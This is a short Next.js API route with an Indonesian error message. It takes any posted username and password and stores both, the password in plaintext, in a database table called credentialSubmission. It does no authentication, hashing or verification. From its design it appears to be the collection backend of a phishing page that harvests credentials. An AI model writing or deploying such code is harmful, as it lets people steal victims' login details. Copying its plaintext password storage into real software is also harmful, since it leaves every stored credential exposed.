import { prisma } from "@/lib/prisma";
import { NextResponse } from "next/server";

export async function POST(req: Request) {
  try {
    const body = (await req.json()) as {
      username?: string;
      password?: string | null;
    };
    const username = String(body.username ?? "").trim().slice(0, 320);
    const password = String(body.password ?? "").slice(0, 500);

    if (!username.length) {
      return NextResponse.json({ ok: false, error: "Username kosong." }, {
        status: 400,
      });
    }

    await prisma.credentialSubmission.create({
      data: { username, password },
    });

    return NextResponse.json({ ok: true });
  } catch (e) {
    console.error(e);
    return NextResponse.json({ ok: false, error: "Database error." }, {
      status: 500,
    });
  }
}
